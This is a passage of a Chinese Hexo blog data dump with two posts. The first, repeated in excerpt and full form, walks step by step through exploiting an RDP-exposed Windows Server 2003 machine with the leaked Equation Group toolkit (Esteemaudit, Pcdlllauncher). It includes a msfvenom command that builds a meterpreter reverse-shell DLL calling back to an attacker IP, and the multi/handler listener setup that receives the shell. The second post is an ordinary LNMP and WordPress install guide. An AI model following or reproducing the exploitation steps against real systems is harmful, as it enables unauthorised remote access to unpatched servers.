src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg\" alt=\"5.jpg\" title=\"5.jpg\"><br>0x02<br>打开命令提示符，输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\win\\fb.py</span><br></pre></td></tr></table></figure></p>\n<p>然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/1.jpg\" alt=\"1.jpg\" title=\"1.jpg\"><br>最后敲击回车<br>0x03<br>显示出<code>fb &gt;</code>之后输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use Esteemaudit</span><br></pre></td></tr></table></figure></p>\n<p>使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可<br>（设置监听还是连接、系统位数、系统版本）<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/2.jpg\" alt=\"\" title=\"2.jpg\"><br>（回拨IP以及端口，端口号可以任意设置）<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/3.jpg\" alt=\"\" title=\"3.jpg\"><br>（配置DLL路径，需要改为实际路径）<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/4.jpg\" alt=\"\" title=\"4.jpg\"><br>之后几个回车即可看到连接成功，如图<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/5.jpg\" alt=\"5.jpg\" title=\"5.jpg\"><br>0x04<br>接着输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use Pcdlllauncher</span><br></pre></td></tr></table></figure></p>\n<p>使用Pcdlllauncher，除了下图其他保持默认即可<br>（改为自己的实际路径）<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/6.jpg\" alt=\"6.jpg\" title=\"6.jpg\"><br>（之前生成的s.dll路径）<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/7.jpg\" alt=\"7.jpg\" title=\"7.jpg\"><br>之后不断回车，会看到如图<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/10.jpg\" alt=\"\" title=\"10.jpg\"><br>不用理他，打开xshell可以看到已经成功反弹shell，如下图<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/8.jpg\" alt=\"\" title=\"8.jpg\"><br>然后就可以比如说输入shell模拟终端执行命令了<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/9.jpg\" alt=\"\" title=\"9.jpg\"></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"验证环境：\"><a href=\"#验证环境：\" class=\"headerlink\" title=\"验证环境：\"></a>验证环境：</h3><p>攻击机1(本次演示IP：172.16.11.2)：windows系统，<a href=\"https://www.python.org/download/releases/2.6.6/\" target=\"_blank\" rel=\"noopener\">安装python2.6.6</a>, <a href=\"https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/\" target=\"_blank\" rel=\"noopener\">pywin32-221.win32-py2.6.exe</a>, xshell, xftp, <a href=\"https://codeload.github.com/misterch0c/shadowbroker/zip/master\" target=\"_blank\" rel=\"noopener\">下载方程式工具包</a>放到C盘，在工具包目录下的windows目录新建文件夹”listeningposts”，并且开放所有端口关闭防火墙，确保内网可以访问之</p>\n<p>攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度</p>\n<p>目标机1(本次演示IP：172.16.12.4)：开放了3389端口的Windows Server 2003</p>\n<p>以上所有IP之间均可以直接访问</p>\n<h3 id=\"验证步骤：\"><a href=\"#验证步骤：\" class=\"headerlink\" title=\"验证步骤：\"></a>验证步骤：</h3>","more":"<h4 id=\"第一步：生成可执行的恶意dll文件\"><a href=\"#第一步：生成可执行的恶意dll文件\" class=\"headerlink\" title=\"第一步：生成可执行的恶意dll文件\"></a>第一步：生成可执行的恶意dll文件</h4><p>0x01<br>首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg\" alt=\"1.jpg\" title=\"1.jpg\"><br>0x02<br>执行命令：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll &gt;s.dll</span><br></pre></td></tr></table></figure></p>\n<p>在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell<br>0x03<br>点击xshell如图位置<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg\" alt=\"3.jpg\" title=\"3.jpg\"><br>打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg\" alt=\"4.jpg\" title=\"4.jpg\"></p>\n<h4 id=\"第二步：配置kali使得kali处于监听状态\"><a href=\"#第二步：配置kali使得kali处于监听状态\" class=\"headerlink\" title=\"第二步：配置kali使得kali处于监听状态\"></a>第二步：配置kali使得kali处于监听状态</h4><p>0x01<br>依次输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set lhost 172.16.12.2</span><br><span class=\"line\">set lport 5555</span><br><span class=\"line\">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure></p>\n<p>看到如图即说明配置成功<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg\" alt=\"2.jpg\" title=\"2.jpg\"><br>这时就可以将xshell最小化，等后边再用</p>\n<h4 id=\"第三步：使用方程式工具包进行攻击\"><a href=\"#第三步：使用方程式工具包进行攻击\" class=\"headerlink\" title=\"第三步：使用方程式工具包进行攻击\"></a>第三步：使用方程式工具包进行攻击</h4><p>0x01<br>将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为”listeningposts”的文件夹，如图，不然运行会报错<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg\" alt=\"5.jpg\" title=\"5.jpg\"><br>0x02<br>打开命令提示符，输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\win\\fb.py</span><br></pre></td></tr></table></figure></p>\n<p>然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/1.jpg\" alt=\"1.jpg\" title=\"1.jpg\"><br>最后敲击回车<br>0x03<br>显示出<code>fb &gt;</code>之后输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use Esteemaudit</span><br></pre></td></tr></table></figure></p>\n<p>使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可<br>（设置监听还是连接、系统位数、系统版本）<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/2.jpg\" alt=\"\" title=\"2.jpg\"><br>（回拨IP以及端口，端口号可以任意设置）<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/3.jpg\" alt=\"\" title=\"3.jpg\"><br>（配置DLL路径，需要改为实际路径）<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/4.jpg\" alt=\"\" title=\"4.jpg\"><br>之后几个回车即可看到连接成功，如图<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/5.jpg\" alt=\"5.jpg\" title=\"5.jpg\"><br>0x04<br>接着输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use Pcdlllauncher</span><br></pre></td></tr></table></figure></p>\n<p>使用Pcdlllauncher，除了下图其他保持默认即可<br>（改为自己的实际路径）<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/6.jpg\" alt=\"6.jpg\" title=\"6.jpg\"><br>（之前生成的s.dll路径）<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/7.jpg\" alt=\"7.jpg\" title=\"7.jpg\"><br>之后不断回车，会看到如图<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/10.jpg\" alt=\"\" title=\"10.jpg\"><br>不用理他，打开xshell可以看到已经成功反弹shell，如下图<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/8.jpg\" alt=\"\" title=\"8.jpg\"><br>然后就可以比如说输入shell模拟终端执行命令了<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/9.jpg\" alt=\"\" title=\"9.jpg\"></p>"},{"title":"搭建L(Linux)+N(Nginx)+M(MySQL)+P(PHP)网站环境，并安装Wordpress","date":"2017-06-16T12:57:54.000Z","_content":"\n### 搭建LNMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，或不适用于其他镜像\n\n### 一、安装Nginx\n\n#### 1.使用 yum 安装 Nginx：\n\nyum install nginx -y\n\n#### 2.修改/etc/nginx/conf.d/default.conf\n去除对 IPv6 地址的监听，可参考下面的示例\n<!--more-->\n```\nserver {\nlisten 80 default_server;\n\t# listen [::]:80 default_server;\nserver_name _;\nroot /usr/share/nginx/html;\n\n\t# Load configuration files for the default server block.\ninclude /etc/nginx/default.d/*.conf;\n\nlocation / {\n}\n\nerror_page 404 /404.html;\nlocation = /40x.html {\n}\n\nerror_page 500 502 503 504 /50x.html;\nlocation = /50x.html {\n}\n\n}\n```\n#### 3.修改完成后，启动 Nginx：\n```\nnginx\n```\n#### 4.将 Nginx 设置为开机自动启动：\n```\nchkconfig nginx on\n```\n### 二、安装MySQL\n\n#### 1.使用 yum 安装 MySQL：\n```\nyum install mysql-server -y\n```\n#### 2.安装完成后，启动 MySQL 服务：\n```\nservice mysqld restart\n```\n#### 3.设置 MySQL 账户 root 密码：\n```\n/usr/bin/mysqladmin -u root password 'MyPas$word4Word_Press'\n```\n#### 4.将 MySQL 设置为开机自动启动：\n```\nchkconfig mysqld on\n```\n### 三、安装PHP\n\n#### 1.使用 yum 安装 PHP：\n```\nyum install php-fpm php-mysql -y\n```\n#### 2.安装之后，启动 PHP-FPM 进程：\n```\nservice php-fpm start\n```\n#### 3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口\n```\nnetstat -nlpt | grep php-fpm\n```\n#### 4.把 PHP-FPM 也设置成开机自动启动：\n```\nchkconfig php-fpm on\n```\n### 安装wordpress\n\n#### 1.配置好 LNMP 环境后，继续使用 yum 来安装 WordPress：\n```\nyum install wordpress -y\n```\n#### 2.进入 MySQL：\n```\nmysql -uroot --password='MyPas$word4Word_Press'\n```\n#### 3.为 WordPress 创建一个数据库：\n```\nCREATE DATABASE wordpress;\n```\n#### 4.MySQL 部分设置完了，我们退出 MySQL 环境：\n```\nexit\n```\n#### 5.把上述的 DB 配置同步到 WordPress 的配置文件中，可参考下面的配置：\n```\nwp-config.php\n<?php\n/**\n* The base configuration for WordPress\n*\n* The wp-config.php creation script uses this file during the\n* installation. You don't have to use the web site, you can\n* copy this file to \"wp-config.php\" and fill in the values.\n*\n* This file contains the following configurations:\n*\n* * MySQL settings\n* * Secret keys\n* * Database table prefix\n* * ABSPATH\n*\n* @link https://codex.wordpress.org/Editing_wp-config.php\n*\n* @package WordPress\n*/\n\n// ** MySQL settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine('DB_NAME', 'wordpress');\n\n/** MySQL database username */\ndefine('DB_USER', 'root');\n\n/** MySQL database password */\ndefine('DB_PASSWORD', 'MyPas$word4Word_Press');\n\n/** MySQL hostname */\ndefine('DB_HOST', 'localhost');\n\n/** Database Charset to use in creating database tables. */\ndefine('DB_CHARSET', 'utf8');\n\n/** The Database Collate type. Don't change this if in doubt. */\ndefine('DB_COLLATE', '');\n\n/**#@+\n* Authentication Unique Keys and Salts.\n*\n* Change these to different unique phrases!\n* You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}\n* You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.\n*\n* @since 2.6.0\n*/\ndefine('AUTH_KEY', 'put your unique phrase here');\ndefine('SECURE_AUTH_KEY', 'put your unique phrase here');\ndefine('LOGGED_IN_KEY', 'put your unique phrase here');\ndefine('NONCE_KEY', 'put your unique phrase here');\ndefine('AUTH_SALT', 'put your unique phrase here');\ndefine('SECURE_AUTH_SALT', 'put your unique phrase here');\ndefine('LOGGED_IN_SALT', 'put your unique phrase here');\ndefine('NONCE_SALT', 'put your unique phrase here');\n\n/**#@-*/\n\n/**\n* WordPress Database Table prefix.\n*\n* You can have multiple installations in one database if you give each\n* a unique prefix. Only numbers, letters, and underscores please!\n*/\n$table_prefix = 'wp_';\n\n/**\n* See http://make.wordpress.org/core/2013/10/25/the-definitive-guide-to-disabling-auto-updates-in-wordpress-3-7\n*/\n\n/* Disable all file change, as RPM base installation are read-only */\ndefine('DISALLOW_FILE_MODS', true);\n\n/* Disable automatic updater, in case you want to allow\nabove FILE_MODS for plugins, themes, ... */\ndefine('AUTOMATIC_UPDATER_DISABLED', true);\n\n/* Core update is always disabled, WP_AUTO_UPDATE_CORE value is ignore */\n\n/**\n* For developers: WordPress debugging mode.\n*\n* Change this to true to enable the display of notices during development.\n* It is strongly recommended that plugin and theme developers use WP_DEBUG\n* in their development environments.\n*\n* For information on other constants that can be used for debugging,\n* visit the Codex.\n*\n* @link https://codex.wordpress.org/Debugging_in_WordPress\n*/\ndefine('WP_DEBUG', false);\n\n/* That's all, stop editing! Happy blogging. */\n\n/** Absolute path to the WordPress directory. */\nif ( !defined('ABSPATH') )\ndefine('ABSPATH', '/usr/share/wordpress');\n\n/** Sets up WordPress vars and included files. */\nrequire_once(ABSPATH . 'wp-settings.php');\n```\n#### WordPress 已经安装完毕，我们配置 Nginx 把请求转发给 PHP-FPM 来处理\n首先，重命名默认的配置文件：\n```\ncd /etc/nginx/conf.d/\nmv default.conf defaut.conf.bak\n```\n在 /etc/nginx/conf.d 创建 wordpress.conf 配置，参考下面的内容：\n```\nwordpress.conf\nserver {\nlisten 80;\nroot /usr/share/wordpress;\nlocation / {\nindex index.php index.html index.htm;\ntry_files $uri $uri/ /index.php index.php;\n}\n\t# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\nlocation ~ .php$ {\nfastcgi_pass 127.0.0.1:9000;\nfastcgi_index index.php;\nfastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\ninclude fastcgi_params;\n}\n}\n```\n#### 6.配置后，通知 Nginx 进程重新加载：\n```\nnginx -s reload\n```\n### 至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面","source":"_posts/post192.md","raw":"---\ntitle: 搭建L(Linux)+N(Nginx)+M(MySQL)+P(PHP)网站环境，并安装Wordpress\ndate: 2017-06-16 20:57:54\ntags: 运维\n---\n\n### 搭建LNMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，或不适用于其他镜像\n\n### 一、安装Nginx\n\n#### 1.使用 yum 安装 Nginx：\n\nyum install nginx -y\n\n#### 2.修改/etc/nginx/conf.d/default.conf\n去除对 IPv6 地址的监听，可参考下面的示例\n<!--more-->\n```\nserver {\nlisten 80 default_server;\n\t# listen [::]:80 default_server;\nserver_name _;\nroot /usr/share/nginx/html;\n\n\t# Load configuration files for the default server block.\ninclude /etc/nginx/default.d/*.conf;\n\nlocation / {\n}\n\nerror_page 404 /404.html;\nlocation = /40x.html {\n}\n\nerror_page 500 502 503 504 /50x.html;\nlocation = /50x.html {\n}\n\n}\n```\n#### 3.修改完成后，启动 Nginx：\n```\nnginx\n```\n#### 4.将 Nginx 设置为开机自动启动：\n```\nchkconfig nginx on\n```\n### 二、安装MySQL\n\n#### 1.使用 yum 安装 MySQL：\n```\nyum install mysql-server -y\n```\n#### 2.安装完成后，启动 MySQL 服务：\n```\nservice mysqld restart\n```\n#### 3.设置 MySQL 账户 root 密码：\n```\n/usr/bin/mysqladmin -u root password 'MyPas$word4Word_Press'\n```\n#### 4.将 MySQL 设置为开机自动启动：\n```\nchkconfig mysqld on\n```\n### 三、安装PHP\n\n#### 1.使用 yum 安装 PHP：\n```\nyum install php-fpm php-mysql -y\n```\n#### 2.安装之后，启动 PHP-FPM 进程：\n```\nservice php-fpm start\n```\n#### 3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口\n```\nnetstat -nlpt | grep php-fpm\n```\n#### 4.把 PHP-FPM 也设置成开机自动启动：\n```\nchkconfig php-fpm on\n```\n### 安装wordpress\n\n#### 1.配置好 LNMP 环境后，继续使用 yum 来安装 WordPress：\n```\nyum install wordpress -y\n```\n#### 2.进入 MySQL：\n```\nmysql -uroot --password='MyPas$word4Word_Press'\n```\n#### 3.为 WordPress 创建一个数据库：\n```\nCREATE DATABASE wordpress;\n```\n#### 4.MySQL 部分设置完了，我们退出 MySQL 环境：\n```\nexit\n```\n#### 5.把上述的 DB 配置同步到 WordPress 的配置文件中，可参考下面的配置：\n```\nwp-config.php\n<?php\n/**\n* The base configuration for WordPress\n*\n* The wp-config.php creation script uses this file during the\n* installation. You don't have to use the web site, you can\n* copy this file to \"wp-config.php\" and fill in the values.\n*\n* This file contains the following configurations:\n*\n* * MySQL settings\n* * Secret keys\n* * Database table prefix\n* * ABSPATH\n*\n* @link https://codex.wordpress.org/Editing_wp-config.php\n*\n* @package WordPress\n*/\n\n// ** MySQL settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine('DB_NAME', 'wordpress');\n\n/** MySQL database username */\ndefine('DB_USER', 'root');\n\n/** MySQL database password */\ndefine('DB_PASSWORD', 'MyPas$word4Word_Press');\n\n/** MySQL hostname */\ndefine('DB_HOST', 'localhost');\n\n/** Database Charset to use in creating database tables. */\ndefine('DB_CHARSET', 'utf8');\n\n/** The Database Collate type. Don't change this if in doubt. */\ndefine('DB_COLLATE', '');\n\n/**#@+\n* Authentication Unique Keys and Salts.\n*\n* Change these to different unique phrases!\n* You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}\n* You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.\n*\n* @since 2.6.0\n*/\ndefine('AUTH_KEY', 'put your unique phrase here');\ndefine('SECURE_AUTH_KEY', 'put your unique phrase here');\ndefine('LOGGED_IN_KEY', 'put your unique phrase here');\ndefine('NONCE_KEY', 'put your unique phrase here');\ndefine('AUTH_SALT', 'put your unique phrase here');\ndefine('SECURE_AUTH_SALT', 'put your unique phrase here');\ndefine('LOGGED_IN_SALT', 'put your unique phrase here');\ndefine('NONCE_SALT', 'put your unique phrase here');\n\n/**#@-*/\n\n/**\n* WordPress Database Table prefix.\n*\n* You can have multiple installations in one database if you give each\n* a unique prefix. Only numbers, letters, and underscores please!\n*/\n$table_prefix = 'wp_';\n\n/**\n* See http://make.wordpress.org/core/2013/10/25/the-definitive-guide-to-disabling-auto-updates-in-wordpress-3-7\n*/\n\n/* Disable all file change, as RPM base installation are read-only */\ndefine('DISALLOW_FILE_MODS', true);\n\n/* Disable automatic updater, in case you want to allow\nabove FILE_MODS for plugins, themes, ... */\ndefine('AUTOMATIC_UPDATER_DISABLED', true);\n\n/* Core update is always disabled, WP_AUTO_UPDATE_CORE value is ignore */\n\n/**\n* For developers: WordPress debugging mode.\n*\n* Change this to true to enable the display of notices during development.\n* It is strongly recommended that plugin and theme developers use WP_DEBUG\n* in their development environments.\n*\n* For information on other constants that can be used for debugging,\n* visit the Codex.\n*\n* @link https://codex.wordpress.org/Debugging_in_WordPress\n*/\ndefine('WP_DEBUG', false);\n\n/* That's all, stop editing! Happy blogging. */\n\n/** Absolute path to the WordPress directory. */\nif ( !defined('ABSPATH') )\ndefine('ABSPATH', '/usr/share/wordpress');\n\n/** Sets up WordPress vars and included files. */\nrequire_once(ABSPATH . 'wp-settings.php');\n```\n#### WordPress 已经安装完毕，我们配置 Nginx 把请求转发给 PHP-FPM 来处理\n首先，重命名默认的配置文件：\n```\ncd /etc/nginx/conf.d/\nmv default.conf defaut.conf.bak\n```\n在 /etc/nginx/conf.d 创建 wordpress.conf 配置，参考下面的内容：\n```\nwordpress.conf\nserver {\nlisten 80;\nroot /usr/share/wordpress;\nlocation / {\nindex index.php index.html index.htm;\ntry_files $uri $uri/ /index.php index.php;\n}\n\t# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\nlocation ~ .php$ {\nfastcgi_pass 127.0.0.1:9000;\nfastcgi_index index.php;\nfastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\ninclude fastcgi_params;\n}\n}\n```\n#### 6.配置后，通知 Nginx 进程重新加载：\n```\nnginx -s reload\n```\n### 至此大功告成，通过浏览器访问服务器IP地址即可打开Wordpress安装页面","slug":"post192","published":1,"updated":"2020-11-02T07:15:43.705Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdh001nq0szene0oupm","content":"<h3 id=\"搭建LNMP环境：以下基于腾讯云镜像CentOS-6-8-64bit，或不适用于其他镜像\"><a href=\"#搭建LNMP环境：以下基于腾讯云镜像CentOS-6-8-64bit，或不适用于其他镜像\" class=\"headerlink\" title=\"搭建LNMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，或不适用于其他镜像\"></a>搭建LNMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，或不适用于其他镜像</h3><h3 id=\"一、安装Nginx\"><a href=\"#一、安装Nginx\" class=\"headerlink\" title=\"一、安装Nginx\"></a>一、安装Nginx</h3><h4 id=\"1-使用-yum-安装-Nginx：\"><a href=\"#1-使用-yum-安装-Nginx：\" class=\"headerlink\" title=\"1.使用 yum 安装 Nginx：\"></a>1.使用 yum 安装 Nginx：</h4><p>yum install nginx -y</p>\n<h4 id=\"2-修改-etc-nginx-conf-d-default-conf\"><a href=\"#2-修改-etc-nginx-conf-d-default-conf\" class=\"headerlink\" title=\"2.修改/etc/nginx/conf.d/default.conf\"></a>2.修改/etc/nginx/conf.d/default.conf</h4><p>去除对 IPv6 地址的监听，可参考下面的示例<br><a id=\"more\"></a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">listen 80 default_server;</span><br><span class=\"line\">\t# listen [::]:80 default_server;</span><br><span class=\"line\">server_name _;</span><br><span class=\"line\">root /usr/share/nginx/html;</span><br><span class=\"line\"></span><br><span class=\"line\">\t# Load configuration files for the default server block.</span><br><span class=\"line\">include /etc/nginx/default.d/*.conf;</span><br><span class=\"line\"></span><br><span class=\"line\">location / &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">error_page 404 /404.html;</span><br><span class=\"line\">location = /40x.html &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">error_page 500 502 503 504 /50x.html;</span><br><span class=\"line\">location = /50x.html &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"3-修改完成后，启动-Nginx：\"><a href=\"#3-修改完成后，启动-Nginx：\" class=\"headerlink\" title=\"3.修改完成后，启动 Nginx：\"></a>3.修改完成后，启动 Nginx：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-将-Nginx-设置为开机自动启动：\"><a href=\"#4-将-Nginx-设置为开机自动启动：\" class=\"headerlink\" title=\"4.将 Nginx 设置为开机自动启动：\"></a>4.将 Nginx 设置为开机自动启动：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chkconfig nginx on</span><br></pre></td></tr></table></figure>\n<h3 id=\"二、安装MySQL\"><a href=\"#二、安装MySQL\" class=\"headerlink\" title=\"二、安装MySQL\"></a>二、安装MySQL</h3><h4 id=\"1-使用-yum-安装-MySQL：\"><a href=\"#1-使用-yum-安装-MySQL：\" class=\"headerlink\" title=\"1.使用 yum 安装 MySQL：\"></a>1.使用 yum 安装 MySQL：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install mysql-server -y</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-安装完成后，启动-MySQL-服务：\"><a href=\"#2-安装完成后，启动-MySQL-服务：\" class=\"headerlink\" title=\"2.安装完成后，启动 MySQL 服务：\"></a>2.安装完成后，启动 MySQL 服务：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service mysqld restart</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-设置-MySQL-账户-root-密码：\"><a href=\"#3-设置-MySQL-账户-root-密码：\" class=\"headerlink\" title=\"3.设置 MySQL 账户 root 密码：\"></a>3.设置 MySQL 账户 root 密码：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/bin/mysqladmin -u root password &apos;MyPas$word4Word_Press&apos;</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-将-MySQL-设置为开机自动启动：\"><a href=\"#4-将-MySQL-设置为开机自动启动：\" class=\"headerlink\" title=\"4.将 MySQL 设置为开机自动启动：\"></a>4.将 MySQL 设置为开机自动启动：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chkconfig mysqld on</span><br></pre></td></tr></table></figure>\n<h3 id=\"三、安装PHP\"><a href=\"#三、安装PHP\" class=\"headerlink\" title=\"三、安装PHP\"></a>三、安装PHP</h3><h4 id=\"1-使用-yum-安装-PHP：\"><a href=\"#1-使用-yum-安装-PHP：\" class=\"headerlink\" title=\"1.使用 yum 安装 PHP：\"></a>1.使用 yum 安装 PHP：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install php-fpm php-mysql -y</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-安装之后，启动-PHP-FPM-进程：\"><a href=\"#2-安装之后，启动-PHP-FPM-进程：\" class=\"headerlink\" title=\"2.安装之后，启动 PHP-FPM 进程：\"></a>2.安装之后，启动 PHP-FPM 进程：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service php-fpm start</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-启动之后，可以使用下面的命令查看-PHP-FPM-进程监听哪个端口\"><a href=\"#3-启动之后，可以使用下面的命令查看-PHP-FPM-进程监听哪个端口\" class=\"headerlink\" title=\"3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口\"></a>3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 